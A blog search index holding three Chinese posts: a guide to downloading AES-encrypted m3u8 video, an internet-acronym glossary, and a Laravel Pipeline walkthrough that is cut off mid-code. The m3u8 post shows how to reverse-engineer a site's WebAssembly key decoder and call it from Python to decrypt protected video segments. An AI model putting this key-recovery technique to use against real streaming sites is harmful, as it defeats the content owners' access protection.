<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>如何爬取 m3u8 视频</title>
    <link href="/download_m3u8_video/"/>
    <url>/download_m3u8_video/</url>
    
    <content type="html"><![CDATA[<p>在尝试抓取一个网站的视频时，发现它是用 m3u8 格式存储的，基于 AES128 加密，但是获取的密钥不是 16 byte，而是 33 byte，导致无法解密。</p><span id="more"></span><h2 id="什么是-m3u8-？和-hls-的关系？"><a href="#什么是-m3u8-？和-hls-的关系？" class="headerlink" title="什么是 m3u8 ？和 hls 的关系？"></a>什么是 m3u8 ？和 hls 的关系？</h2><p>HLS（HTTP Live Streaming）是 Apple 推出的一种 基于 HTTP 的流媒体传输协议。<br>它将音视频内容切割成一个个小的媒体片段（通常是 .ts 文件），并通过一个 播放列表文件（m3u8） 控制播放顺序。</p><p>.m3u8 是 HLS 播放列表文件的格式，本质是一个文本文件，内容是一些标签（如 #EXTINF、#EXT-X-KEY 等）和媒体片段的 URL 路径。</p><p>.m3u8 文件的格式如下：</p><figure><div class="code-wrapper"><pre class="language-m3u8" data-language="m3u8"><code class="language-m3u8">#EXTM3U#EXT-X-VERSION:3#EXT-X-TARGETDURATION:10#EXT-X-KEY:METHOD&#x3D;AES-128,URI&#x3D;&quot;https:&#x2F;&#x2F;example.com&#x2F;key.key&quot;,IV&#x3D;0x00000000000000000000000000000001#EXTINF:9.009,segment1.ts#EXTINF:9.009,segment2.ts#EXTINF:9.009,segment3.ts#EXT-X-ENDLIST</code></pre></div></figure><p>• #EXT-X-KEY 指定了加密方法和 key 地址<br>• #EXTINF 表示每个片段的时长<br>• segmentX.ts 是视频的实际数据片段</p><h2 id="解析-m3u8-文件"><a href="#解析-m3u8-文件" class="headerlink" title="解析 m3u8 文件"></a>解析 m3u8 文件</h2><p>当加密算法指定为 AES-128 时，key 的长度应该是 16 字节（128 位），如果是 URL，那么 URL 返回的内容也应该是 16 字节。<br>但是我访问 key 返回的内容是 33 字节：</p><p><img src="/../img/m3u8_key.png" alt="m3u8_key"></p><p>继续深入分析前端代码，全文搜索关键字，decode 之类的，发现一段 js 如下：</p><figure><div class="code-wrapper"><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> len <span class="token operator">=</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>  <span class="token keyword">var</span> inputPtr <span class="token operator">=</span> decoderModule<span class="token punctuation">.</span><span class="token function">_malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>  decoderModule<span class="token punctuation">.</span><span class="token constant">HEAPU8</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> inputPtr<span class="token punctuation">)</span><span class="token punctuation">;</span>  decoderModule<span class="token punctuation">.</span><span class="token function">_decrypt</span><span class="token punctuation">(</span>inputPtr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> outputArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>    decoderModule<span class="token punctuation">.</span><span class="token constant">HEAPU8</span><span class="token punctuation">.</span>buffer<span class="token punctuation">,</span>    inputPtr<span class="token punctuation">,</span>    <span class="token number">16</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  decoderModule<span class="token punctuation">.</span><span class="token function">_free</span><span class="token punctuation">(</span>inputPtr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> outputArray<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div></figure><p>decoderModule 是一个 WebAssembly 模块。<br>下载通过 <code>wasm2wat</code> 转换成的文本文件如下：</p><figure><div class="code-wrapper"><pre class="language-wat" data-language="wat"><code class="language-wat">...  (table (;0;) 1 1 funcref)  (memory (;0;) 256 256)  (global (;0;) (mut i32) (i32.const 5244960))  (export &quot;b&quot; (memory 0))  (export &quot;c&quot; (func 2))  (export &quot;d&quot; (func 8))  (export &quot;e&quot; (func 4))  (export &quot;f&quot; (func 3))  (export &quot;g&quot; (table 0))  (export &quot;h&quot; (func 7))  (export &quot;i&quot; (func 6))  (export &quot;j&quot; (func 5))...</code></pre></div></figure><p>暴露出几个方法，但是都是单个字母命名，不清楚每个函数的作用，无法直接调用。因为是 WebAssembly 模块，所以肯定有 js 声明文件，<br>继续搜索关键字，找到了前端如何调用这个方法的位置：</p><figure><div class="code-wrapper"><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">var</span> asm <span class="token operator">=</span> <span class="token function">createWasm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ___wasm_call_ctors <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">[</span><span class="token string">"___wasm_call_ctors"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>___wasm_call_ctors <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"___wasm_call_ctors"</span><span class="token punctuation">]</span> <span class="token operator">=</span>    Module<span class="token punctuation">[</span><span class="token string">"asm"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"c"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _decrypt <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">[</span><span class="token string">"_decrypt"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>_decrypt <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"_decrypt"</span><span class="token punctuation">]</span> <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"asm"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"d"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>    <span class="token keyword">null</span><span class="token punctuation">,</span>    arguments  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _malloc <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">[</span><span class="token string">"_malloc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>_malloc <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"_malloc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"asm"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"e"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>    <span class="token keyword">null</span><span class="token punctuation">,</span>    arguments  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _free <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">[</span><span class="token string">"_free"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>_free <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"_free"</span><span class="token punctuation">]</span> <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"asm"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"f"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>    <span class="token keyword">null</span><span class="token punctuation">,</span>    arguments  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> stackSave <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">[</span><span class="token string">"stackSave"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>stackSave <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"stackSave"</span><span class="token punctuation">]</span> <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"asm"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>    <span class="token keyword">null</span><span class="token punctuation">,</span>    arguments  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> stackRestore <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">[</span><span class="token string">"stackRestore"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>stackRestore <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"stackRestore"</span><span class="token punctuation">]</span> <span class="token operator">=</span>    Module<span class="token punctuation">[</span><span class="token string">"asm"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> stackAlloc <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">[</span><span class="token string">"stackAlloc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>stackAlloc <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"stackAlloc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> Module<span class="token punctuation">[</span><span class="token string">"asm"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"j"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>    <span class="token keyword">null</span><span class="token punctuation">,</span>    arguments  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span></code></pre></div></figure><p>知道每个函数的作用就可以用 python 把对每个 ts 分片进行解密了，具体解密代码如下：</p><figure><div class="code-wrapper"><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decrypt_key</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> encrypted_key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Decrypt encryption key using WASM module"""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        malloc <span class="token operator">=</span> self<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>e        decrypt <span class="token operator">=</span> self<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>d        free <span class="token operator">=</span> self<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>f        memory <span class="token operator">=</span> self<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>b        input_ptr <span class="token operator">=</span> malloc<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>encrypted_key<span class="token punctuation">)</span><span class="token punctuation">)</span>        mem_view <span class="token operator">=</span> memory<span class="token punctuation">.</span>uint8_view<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> byte <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>encrypted_key<span class="token punctuation">)</span><span class="token punctuation">:</span>            mem_view<span class="token punctuation">[</span>input_ptr <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> byte        decrypt<span class="token punctuation">(</span>input_ptr<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>encrypted_key<span class="token punctuation">)</span><span class="token punctuation">)</span>        decrypted_key <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>mem_view<span class="token punctuation">[</span>input_ptr<span class="token punctuation">:</span>input_ptr <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        free<span class="token punctuation">(</span>input_ptr<span class="token punctuation">)</span>        <span class="token keyword">return</span> decrypted_key    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Decryption failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">raise</span></code></pre></div></figure><p>对每个 ts 分片解密以后再利用 ffmpeg 拼接即可。</p>]]></content>
    
    
    <categories>
      
      <category>Tech</category>
      
    </categories>
    
    
    <tags>
      
      <tag>m3u8</tag>
      
      <tag>ffmpeg</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>互联网常用英语术语表达</title>
    <link href="/english-terms/"/>
    <url>/english-terms/</url>
    
    <content type="html"><![CDATA[<p>闲逛各大外网社区发现的各类英语术语记录。</p><span id="more"></span><h2 id="网络安全与渗透测试术语"><a href="#网络安全与渗透测试术语" class="headerlink" title="网络安全与渗透测试术语"></a>网络安全与渗透测试术语</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><ul><li>OSINT (Open Source Intelligence): 开源情报收集</li><li>CVE (Common Vulnerabilities and Exposures): 通用漏洞披露</li><li>PoC (Proof of Concept): 概念验证代码</li><li>RCE (Remote Code Execution): 远程代码执行</li><li>XSS (Cross-Site Scripting): 跨站脚本攻击</li><li>CSRF (Cross-Site Request Forgery): 跨站请求伪造</li></ul><h3 id="测试流程相关"><a href="#测试流程相关" class="headerlink" title="测试流程相关"></a>测试流程相关</h3><ul><li>CTF (Capture The Flag): 网络安全夺旗赛</li><li>MITM (Man In The Middle): 中间人攻击</li><li>C2 (Command and Control): 命令控制服务器</li><li>RAT (Remote Access Trojan): 远程访问木马</li><li>WAF (Web Application Firewall): Web应用防火墙</li><li>IDS (Intrusion Detection System): 入侵检测系统</li><li>IPS (Intrusion Prevention System): 入侵防御系统</li></ul><h3 id="安全评估术语"><a href="#安全评估术语" class="headerlink" title="安全评估术语"></a>安全评估术语</h3><ul><li>VA (Vulnerability Assessment): 漏洞评估</li><li>PT (Penetration Testing): 渗透测试</li><li>BOF (Buffer Overflow): 缓冲区溢出</li><li>SQLi (SQL Injection): SQL注入</li><li>LFI (Local File Inclusion): 本地文件包含</li><li>RFI (Remote File Inclusion): 远程文件包含</li><li>OWASP (Open Web Application Security Project): 开放式Web应用程序安全项目</li></ul><h2 id="游戏社区术语"><a href="#游戏社区术语" class="headerlink" title="游戏社区术语"></a>游戏社区术语</h2><h3 id="游戏类型相关"><a href="#游戏类型相关" class="headerlink" title="游戏类型相关"></a>游戏类型相关</h3><ul><li>MMORPG (Massive Multiplayer Online Role-Playing Game): 大型多人在线角色扮演游戏</li><li>FPS (First-Person Shooter): 第一人称射击游戏</li><li>MOBA (Multiplayer Online Battle Arena): 多人在线战术竞技游戏</li><li>RTS (Real-Time Strategy): 即时战略游戏</li></ul><h3 id="游戏交流用语"><a href="#游戏交流用语" class="headerlink" title="游戏交流用语"></a>游戏交流用语</h3><ul><li>GG (Good Game): 比赛结束时表示”打得好”</li><li>AFK (Away From Keyboard): 暂时离开键盘</li><li>BRB (Be Right Back): 马上回来</li><li>OP (Overpowered): 能力过于强大，需要平衡</li><li>Nerf: 削弱角色或装备的能力</li><li>Buff: 增强角色或装备的能力</li><li>KDA (Kill&#x2F;Death&#x2F;Assist): 击杀&#x2F;死亡&#x2F;助攻比率</li></ul><h2 id="编程社区术语"><a href="#编程社区术语" class="headerlink" title="编程社区术语"></a>编程社区术语</h2><h3 id="开发流程相关"><a href="#开发流程相关" class="headerlink" title="开发流程相关"></a>开发流程相关</h3><ul><li>IDE (Integrated Development Environment): 集成开发环境</li><li>API (Application Programming Interface): 应用程序编程接口</li><li>LGTM (Looks Good To Me): 代码审查通过</li><li>WIP (Work In Progress): 工作进行中</li><li>PR (Pull Request): 拉取请求</li><li>RTFM (Read The F**king Manual): 请阅读使用手册</li><li>POC (Proof of Concept): 概念验证</li></ul><h3 id="技术交流用语"><a href="#技术交流用语" class="headerlink" title="技术交流用语"></a>技术交流用语</h3><ul><li>ASAP (As Soon As Possible): 尽快完成</li><li>TL;DR (Too Long; Didn’t Read): 太长不看，需要总结</li><li>IINM (If I’m Not Mistaken): 如果我没记错的话</li><li>AFAIK (As Far As I Know): 据我所知</li><li>IMO (In My Opinion): 依我看来</li></ul><h2 id="日常生活网络用语"><a href="#日常生活网络用语" class="headerlink" title="日常生活网络用语"></a>日常生活网络用语</h2><h3 id="社交媒体常用语"><a href="#社交媒体常用语" class="headerlink" title="社交媒体常用语"></a>社交媒体常用语</h3><ul><li>FOMO (Fear Of Missing Out): 害怕错过</li><li>TBH (To Be Honest): 说实话</li><li>IDK (I Don’t Know): 我不知道</li><li>BTW (By The Way): 顺便说一下</li><li>FYI (For Your Information): 供参考</li><li>DIY (Do It Yourself): 自己动手做</li><li>FWIW (For What It’s Worth): 供参考；顺便说一下；不知道有没有帮助，但是…</li></ul><h3 id="商务沟通用语"><a href="#商务沟通用语" class="headerlink" title="商务沟通用语"></a>商务沟通用语</h3><ul><li>ROI (Return On Investment): 投资回报率</li><li>ASAP (As Soon As Possible): 尽快</li><li>EOD (End Of Day): 工作日结束前</li><li>OOO (Out Of Office): 不在办公室</li><li>WFH (Work From Home): 在家办公</li><li>ETA (Estimated Time of Arrival): 预计到达时间</li></ul><h3 id="情感表达用语"><a href="#情感表达用语" class="headerlink" title="情感表达用语"></a>情感表达用语</h3><ul><li>LOL (Laugh Out Loud): 大声笑</li><li>OMG (Oh My God): 天啊</li><li>ILY (I Love You): 我爱你</li><li>XOXO (Hugs and Kisses): 抱抱和亲亲</li><li>TMI (Too Much Information): 信息过多</li><li>NVM (Never Mind): 没关系</li></ul>]]></content>
    
    
    <categories>
      
      <category>English</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>源码分析--Laravel Pipeline</title>
    <link href="/laravel-pipeline/"/>
    <url>/laravel-pipeline/</url>
    
    <content type="html"><![CDATA[<p>在软件开发中，数据处理往往需要经过多个步骤。<code>Laravel</code> 框架提供的 Pipeline（管道）模式为这类需求提供了优雅的解决方案。本文将深入剖析 Pipeline 模式的工作原理及其在实际开发中的应用。</p><span id="more"></span><div class="note note-primary">            <p><code>Laravel</code>: 11.x<br>PHP: 8.x<br>code: <code>vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php</code><br>docs: <a href="https://laravel.com/docs/11.x/helpers#pipeline">https://laravel.com/docs/11.x/helpers#pipeline</a></p>          </div><h2 id="理解-Pipeline-模式"><a href="#理解-Pipeline-模式" class="headerlink" title="理解 Pipeline 模式"></a>理解 Pipeline 模式</h2><p>要理解 Pipeline 模式，不妨想象一条工业生产线：产品从流水线的一端进入，依次经过不同的工作站，每个工作站都会对产品进行特定的处理。到达终点时，产品就完成了所有必要的加工步骤。Pipeline 模式就是这个概念在软件中的实现——数据像产品一样，流经一系列预设的处理环节，每个环节都可以对数据进行验证、转换或者其他必要的处理。</p><h2 id="Laravel-Pipeline-的设计思路"><a href="#Laravel-Pipeline-的设计思路" class="headerlink" title="Laravel Pipeline 的设计思路"></a>Laravel Pipeline 的设计思路</h2><p><code>Laravel</code> 的 Pipeline 实现主要包含以下核心要素：</p><ol><li>Pipeline 主体类（<code>Illuminate\Pipeline\Pipeline</code>）</li><li>多个独立的处理管道</li><li>需要处理的数据</li><li>处理完成后的回调函数</li></ol><p>框架为我们提供了四个关键方法来操作这个流程：</p><ul><li><code>send()</code>：输入初始数据</li><li><code>through()</code>：设置处理管道的顺序</li><li><code>via()</code>：指定处理方法（默认是”handle”）</li><li><code>then()</code>：执行整个流程并处理结果</li></ul><h2 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h2><p>让我们通过一个用户注册的例子来展示 Pipeline 的实际应用：</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Services</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Closure</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Pipeline<span class="token punctuation">\</span>Pipeline</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">UserRegistrationPipeline</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">processRegistration</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token class-name static-context">Pipeline</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">)</span>            <span class="token operator">-></span><span class="token function">send</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">)</span>            <span class="token operator">-></span><span class="token function">through</span><span class="token punctuation">(</span><span class="token punctuation">[</span>                <span class="token class-name static-context">ValidateUserData</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span>        <span class="token comment">// 数据验证</span>                <span class="token class-name static-context">NormalizeUserInput</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span>      <span class="token comment">// 数据标准化</span>                <span class="token class-name static-context">CreateUserAccount</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span>       <span class="token comment">// 创建账户</span>                <span class="token class-name static-context">SendWelcomeEmail</span><span class="token operator">::</span><span class="token keyword">class</span>         <span class="token comment">// 发送欢迎邮件</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token operator">-></span><span class="token function">thenReturn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></div></figure><p>每个处理环节都专注于特定的任务：</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidateUserData</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">handle</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">Closure</span> <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'邮箱格式不正确'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">NormalizeUserInput</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">handle</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">Closure</span> <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 统一转换为小写，确保数据一致性</span>        <span class="token variable">$userData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$userData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$userData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></div></figure><h2 id="扩展功能"><a href="#扩展功能" class="headerlink" title="扩展功能"></a>扩展功能</h2><h3 id="条件处理"><a href="#条件处理" class="headerlink" title="条件处理"></a>条件处理</h3><p>Pipeline 集成了 Conditionable trait，我们可以使用 <code>when</code> 和 <code>unless</code> 方法来实现条件处理：</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$pipeline</span>    <span class="token operator">-></span><span class="token function">send</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">when</span><span class="token punctuation">(</span><span class="token variable">$needsValidation</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">through</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token class-name static-context">ValidateData</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">when</span><span class="token punctuation">(</span><span class="token variable">$needsNormalization</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">through</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token class-name static-context">NormalizeData</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">when</span><span class="token punctuation">(</span><span class="token variable">$isProduction</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">through</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token class-name static-context">LogOperation</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">thenReturn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></figure><p>when 源码：</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">when</span><span class="token punctuation">(</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token keyword type-hint">callable</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$value</span> <span class="token keyword">instanceof</span> <span class="token class-name">Closure</span> <span class="token operator">?</span> <span class="token variable">$value</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span 